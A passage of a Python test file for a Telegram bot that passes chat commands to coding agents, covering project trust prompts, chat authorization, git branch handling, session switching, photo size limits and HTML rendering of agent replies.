import asyncio
import html
import shlex
from pathlib import Path
from types import SimpleNamespace

from coding_agent_telegram.agent_runner import AgentRunResult, AgentStallInfo
from coding_agent_telegram.command_router import CommandRouter, RouterDeps
from coding_agent_telegram.config import AppConfig
from coding_agent_telegram.session_store import SessionStore


class DummyRunner:
    def __init__(self):
        self.create_calls = []
        self.resume_calls = []

    def create_session(self, provider, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.create_calls.append(
            {
                "provider": provider,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id="sess_abc123",
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )

    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="",
            error_message=None,
            raw_events=[],
        )


class MarkdownRunner(DummyRunner):
    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="See [agent_runner.py](/tmp/agent_runner.py) and `config.py`.",
            error_message=None,
            raw_events=[],
        )


class CommandBlockRunner(DummyRunner):
    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="Run this command:\n```bash\ngit commit -m \"test\"\n```",
            error_message=None,
            raw_events=[],
        )


class SessionIdRotatingRunner(DummyRunner):
    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id="sess_rotated",
            success=True,
            assistant_text="rotated",
            error_message=None,
            raw_events=[],
        )


class ResumeReplacementRunner(DummyRunner):
    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=None,
            success=False,
            assistant_text="",
            error_message="Failed to resume session.",
            raw_events=[],
        )


class LongEscapedMarkdownRunner(DummyRunner):
    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
            }
        )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="\n".join(["<tag> & value" for _ in range(40)]),
            error_message=None,
            raw_events=[],
        )


class FakeBot:
    def __init__(self):
        self.messages = []
        self.actions = []

    async def send_message(self, chat_id, text, parse_mode=None, reply_markup=None):
        self.messages.append((chat_id, text, parse_mode, reply_markup))

    async def send_chat_action(self, chat_id, action):
        self.actions.append((chat_id, action))


class FakeGitManager:
    def __init__(
        self,
        *,
        is_git_repo=False,
        current_branch=None,
        default_branch=None,
        local_branches=None,
        prepare_result=None,
        checkout_result=None,
        git_command_results=None,
        push_result=None,
    ):
        self._is_git_repo = is_git_repo
        self._current_branch = current_branch
        self._default_branch = default_branch
        self._local_branches = local_branches or []
        self.prepare_result = prepare_result
        self.checkout_result = checkout_result
        self.git_command_results = list(git_command_results or [])
        self.push_result = push_result
        self.refresh_result = None
        self.git_commands = []
        self.safe_git_commands = []
        self.push_calls = []

    def is_git_repo(self, project_path):
        return self._is_git_repo

    def current_branch(self, project_path):
        return self._current_branch

    def default_branch(self, project_path):
        return self._default_branch

    def list_local_branches(self, project_path):
        return self._local_branches

    def refresh_current_branch(self, project_path):
        return self.refresh_result

    def prepare_branch(self, project_path, *, origin_branch, new_branch):
        return self.prepare_result

    def checkout_branch(self, project_path, branch_name):
        return self.checkout_result

    def run_git_command(self, project_path, args):
        self.git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def run_safe_commit_command(self, project_path, args):
        self.safe_git_commands.append((project_path, args))
        if self.git_command_results:
            return self.git_command_results.pop(0)
        return SimpleNamespace(success=True, message=f"git {' '.join(args)} completed.")

    def push_branch(self, project_path, branch_name):
        self.push_calls.append((project_path, branch_name))
        if self.push_result is not None:
            return self.push_result
        return SimpleNamespace(success=True, message=f"Pushed branch '{branch_name}' to origin.", current_branch=branch_name)


class FakeTelegramFile:
    def __init__(self, content: bytes, file_path: str):
        self._content = content
        self.file_path = file_path

    async def download_as_bytearray(self):
        return bytearray(self._content)


class FakePhotoSize:
    def __init__(self, telegram_file: FakeTelegramFile, *, file_size: int | None = None):
        self.telegram_file = telegram_file
        self.file_size = file_size if file_size is not None else len(getattr(telegram_file, "_content", b""))

    async def get_file(self):
        return self.telegram_file


def make_update(chat_id=123, chat_type="private", text="hello"):
    return SimpleNamespace(
        effective_chat=SimpleNamespace(id=chat_id, type=chat_type),
        message=SimpleNamespace(text=text, photo=None, caption=None),
    )


def make_config(tmp_path: Path) -> AppConfig:
    return AppConfig(
        workspace_root=tmp_path,
        state_file=tmp_path / "state.json",
        state_backup_file=tmp_path / "state.json.bak",
        log_level="INFO",
        log_dir=tmp_path / "logs",
        telegram_bot_tokens=("x",),
        allowed_chat_ids={123},
        codex_bin="codex",
        copilot_bin="copilot",
        codex_model="",
        copilot_model="",
        copilot_autopilot=True,
        copilot_no_ask_user=True,
        copilot_allow_all=True,
        copilot_allow_all_tools=False,
        copilot_allow_tools=(),
        copilot_deny_tools=(),
        copilot_available_tools=(),
        codex_approval_policy="never",
        codex_sandbox_mode="workspace-write",
        codex_skip_git_repo_check=False,
        enable_commit_command=False,
        snapshot_text_file_max_bytes=200000,
        max_telegram_message_length=3000,
        enable_sensitive_diff_filter=True,
        default_agent_provider="codex",
    )


def test_project_command_rejects_path(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend/api"], bot=bot)

    asyncio.run(router.handle_project(update, context))
    assert "Invalid project folder" in bot.messages[-1][1]


def test_unauthorized_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_id=999)
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_group_chat_is_ignored_silently(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(chat_type="group")
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages == []


def test_project_command_creates_missing_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert (tmp_path / "backend").is_dir()
    assert store.get_chat_state("bot-a", 123)["current_project_folder"] == "backend"
    assert store.is_project_trusted("backend") is True
    assert "Project set: backend" in bot.messages[-1][1]


def test_project_command_warns_when_existing_project_is_untrusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][1] == "Do you trust this project?\nProject: <code>backend</code>"
    assert bot.messages[-1][3] is not None
    assert store.is_project_trusted("backend") is False


def test_project_command_reports_current_branch_for_git_repo(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert "Current branch: main" in bot.messages[-1][1]
    assert "If <origin_branch> is not specified, the bot uses the default branch: main." in bot.messages[-1][1]
    assert "If you do not set one, the bot will work on the current branch: main" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["current_branch"] == "main"


def test_project_command_warns_when_active_session_belongs_to_another_project(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_1", "old-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["frontend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    message = bot.messages[-1][1]
    assert "Warning: the current active session is bound to a different project." in message
    assert "Session project: backend" in message
    assert "Start a new session with /new" in message


def test_trust_project_callback_marks_project_trusted(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    answers = []
    edited = []
    query = SimpleNamespace(
        data="trustproject:yes:backend",
        answer=lambda: answers.append("answered"),
        edit_message_text=lambda text: edited.append(text),
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="trustproject:yes:backend",
            answer=(lambda: None),
            edit_message_text=(lambda text: None),
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_trust_project_callback(update, context))

    assert store.is_project_trusted("backend") is True
    assert edited[-1] == "Project trusted: backend"


def test_branch_command_requires_project_first(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "No project selected." in bot.messages[-1][1]


def test_branch_command_lists_branches_when_project_is_set(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        default_branch="main",
        local_branches=["main", "feature-1", "feature-2"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-1' from origin.",
        current_branch="feature-1",
        default_branch="main",
        warnings=(),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Project: backend" in message
    assert "Current branch: feature-1" in message
    assert "Default branch: main" in message
    assert "* feature-1 (current branch)" in message
    assert "- main (default)" in message
    assert "/branch <new_branch>" in message


def test_branch_command_lists_branches_even_when_refresh_warns(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-deleted-remote",
        default_branch="main",
        local_branches=["main", "feature-deleted-remote"],
    )
    router.git.refresh_result = SimpleNamespace(
        success=True,
        message="Updated branch 'feature-deleted-remote' from origin.",
        current_branch="feature-deleted-remote",
        default_branch="main",
        warnings=("git pull failed for branch: feature-deleted-remote",),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    message = bot.messages[-1][1]
    assert "Refresh warnings:" in message
    assert "git pull failed for branch: feature-deleted-remote" in message
    assert "* feature-deleted-remote (current branch)" in message
    assert "- main (default)" in message


def test_branch_command_uses_default_branch_when_origin_not_provided(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        prepare_result=SimpleNamespace(
            success=True,
            message="Created branch 'feature-1' from 'main'.",
            current_branch="feature-1",
            default_branch="main",
        )
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["feature-1"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Created branch 'feature-1' from 'main'." in bot.messages[-1][1]
    assert "Current branch: feature-1" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["current_branch"] == "feature-1"


def test_branch_command_switches_to_existing_branch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.create_session("bot-a", 123, "sess_branch", "branch-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        prepare_result=SimpleNamespace(
            success=True,
            message="Switched to existing branch 'main'.",
            current_branch="main",
            default_branch="main",
        )
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["main"], bot=bot)

    asyncio.run(router.handle_branch(update, context))

    assert "Switched to existing branch 'main'." in bot.messages[-1][1]
    assert "Current branch: main" in bot.messages[-1][1]
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "main"
    assert state["sessions"]["sess_branch"]["branch_name"] == "main"


class StallingRunner(DummyRunner):
    def create_session(self, provider, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().create_session(
            provider,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
        )

    def resume_session(self, provider, session_id, project_path, user_message, *, skip_git_repo_check=False, image_paths=(), on_stall=None):
        if on_stall is not None:
            on_stall(
                AgentStallInfo(
                    command=("codex", "exec", "resume"),
                    elapsed_seconds=18.0,
                    idle_seconds=18.0,
                    seen_output=False,
                    last_stderr="",
                )
            )
        return super().resume_session(
            provider,
            session_id,
            project_path,
            user_message,
            skip_git_repo_check=skip_git_repo_check,
            image_paths=image_paths,
            on_stall=on_stall,
        )


def test_new_command_supports_copilot_provider(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session", "copilot"], bot=bot)

    asyncio.run(router.handle_new(update, context))
    state = store.get_chat_state("bot-a", 123)
    sess = state["sessions"][state["active_session_id"]]
    assert sess["provider"] == "copilot"
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_skips_git_repo_check_for_trusted_project(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.trust_project("backend")
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls[-1]["skip_git_repo_check"] is True
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_rejects_duplicate_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.create_session("bot-a", 123, "sess_existing", "my-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert "Session name already exists: my-session" in bot.messages[-1][1]


def test_new_command_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert any("Session creation appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_switch_lists_latest_10_sessions_by_default(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 1/2):" in message
    assert "session-11" in message
    assert "session-2" in message
    assert "session-1" not in message
    assert "Pages: /switch page 1 ... /switch page 2" in message
    assert "/switch <session_id>" in message


def test_switch_lists_requested_page(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "2"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 2/2):" in message
    assert "session-1" in message
    assert "session-0" in message
    assert "session-11" not in message


def test_switch_by_session_id_still_works(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Switched to session: session-a" in bot.messages[-1][1]


def test_switch_does_not_persist_if_branch_checkout_fails(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="missing-branch")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        checkout_result=SimpleNamespace(success=False, message="Failed to checkout branch: missing-branch"),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Failed to checkout branch: missing-branch" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_b"


def test_switch_rejects_missing_project_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "deleted-project", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Project folder no longer exists for this session: deleted-project" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_b"


def test_send_text_uses_html_parse_mode(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][2] == "HTML"


def test_photo_message_is_saved_and_forwarded_to_codex(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="what is shown here?"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls
    image_paths = runner.resume_calls[-1]["image_paths"]
    assert len(image_paths) == 1
    assert image_paths[0].is_file()
    assert "/.coding-agent-telegram/telegram_attachments/backend/" in image_paths[0].as_posix()
    assert runner.resume_calls[-1]["user_message"].startswith("An image is attached at ../.coding-agent-telegram/telegram_attachments/backend/")
    assert "Open and inspect that image before answering." in runner.resume_calls[-1]["user_message"]
    assert "what is shown here?" in runner.resume_calls[-1]["user_message"]


def test_photo_message_rejected_for_copilot_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(FakeTelegramFile(b"fake-image-bytes", "photos/pic.png"))
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert "Photo attachments are currently supported only for codex sessions." in bot.messages[-1][1]


def test_photo_message_rejected_when_declared_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    photo = FakePhotoSize(
        FakeTelegramFile(b"small-content", "photos/pic.png"),
        file_size=(5 * 1024 * 1024) + 1,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_photo_message_rejected_when_downloaded_size_exceeds_limit(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_photo", "photo-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    oversized = b"x" * ((5 * 1024 * 1024) + 1)
    photo = FakePhotoSize(FakeTelegramFile(oversized, "photos/pic.png"), file_size=1024)
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=[photo], caption="look"),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert runner.resume_calls == []
    assert bot.messages[-1][1] == "Photo is too large. The maximum supported size is 5 MB."


def test_assistant_output_is_rendered_as_html_not_raw_markdown(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = MarkdownRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    codex_message = bot.messages[1]
    assert codex_message[2] == "HTML"
    assert "[agent_runner.py](" not in codex_message[1]
    assert "<code>agent_runner.py</code>" in codex_message[1]
    assert "<code>config.py</code>" in codex_message[1]


def test_assistant_command_block_is_sent_separately(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CommandBlockRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_cmd", "command-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="give me the command")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any(message[1] == "Command (2/2)" for message in bot.messages)
    assert any("git commit -m &quot;test&quot;" in message[1] for message in bot.messages)


def test_successful_resume_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = SessionIdRotatingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "rotating-session", "backend", "codex")
